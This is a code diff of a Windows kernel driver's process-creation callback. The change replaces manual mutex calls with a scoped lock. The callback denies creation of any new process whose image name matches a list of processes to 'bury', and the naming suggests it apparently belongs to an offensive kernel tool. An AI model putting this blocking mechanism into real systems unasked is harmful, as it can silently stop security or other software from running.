@@ -18,30 +18,30 @@ BeBury_ProcessNotifyRoutineEx(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NO
 {
     UNREFERENCED_PARAMETER(Process);
 
-    ExAcquireFastMutex(&BeGlobals::beBuryMutex);
+    { // LOCK
+        AutoLock<FastMutex> _lock(BeGlobals::buryLock);
 
-    if (CreateInfo) // If new process is created ...
-    {
-        LOG_MSG("Process Creation %i: %wZ \r\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName);
-
-        // ... check for each process
-        for (INT i = 0; i < BeGlobals::beBuryTargetProcesses.length; ++i)
+        if (CreateInfo) // If new process is created ...
         {
-            if (!BeIsStringNull(BeGlobals::beBuryTargetProcesses.array[i]))
+            LOG_MSG("Process Creation %i: %wZ \r\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName);
+
+            // ... check for each process
+            for (INT i = 0; i < BeGlobals::beBuryTargetProcesses.length; ++i)
             {
-                // ... if its one we want to bury ...
-                if (StrStrIW(
-                    CreateInfo->ImageFileName->Buffer,
-                    BeGlobals::beBuryTargetProcesses.array[i]
-                ) != NULL) 
+                if (!BeIsStringNull(BeGlobals::beBuryTargetProcesses.array[i]))
                 {
-                    LOG_MSG("Blocking buried process from starting. \r\n");
-                    // ... then block it by setting the creation status to denied
-                    CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
+                    // ... if its one we want to bury ...
+                    if (StrStrIW(
+                        CreateInfo->ImageFileName->Buffer,
+                        BeGlobals::beBuryTargetProcesses.array[i]
+                    ) != NULL)
+                    {
+                        LOG_MSG("Blocking buried process from starting. \r\n");
+                        // ... then block it by setting the creation status to denied
+                        CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
+                    }
                 }
             }
         }
-    }
-
-    ExReleaseFastMutex(&BeGlobals::beBuryMutex);
+    } // LOCK END
 }
